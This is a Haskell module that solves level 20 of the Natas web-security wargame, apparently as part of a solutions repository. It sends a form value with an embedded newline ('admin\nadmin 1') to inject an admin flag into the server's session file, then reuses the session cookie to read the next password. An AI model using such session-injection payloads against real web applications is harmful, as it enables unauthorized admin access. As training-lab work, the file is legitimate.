{-# LANGUAGE OverloadedStrings #-}

module Natas.Natas20 where

import           Data.Text    (Text)
import           Safe         (headMay, lastMay)

import           Network.Wreq (Options, Part, cookies, partText,
                               responseCookieJar)

import           Control.Lens

import           Natas.Natas
import           Natas.Parse

solution :: Solution
solution = do
  req <- postLevel 20 defaultForm
  let placeJar = cookies ?~ (req ^. responseCookieJar)
  attemptConnect placeJar

defaultForm :: Part
defaultForm = partText "name" "admin\nadmin 1"

attemptConnect :: (Options -> Options) -> IO (Maybe Text)
attemptConnect placeJar = do
  ckireq <- postLevel' 20 (parentUri 20) placeJar defaultForm
  let body = reqBody ckireq
      match = headMay (workupBody' extractPassword body)
  pure $ match >>= lastMay
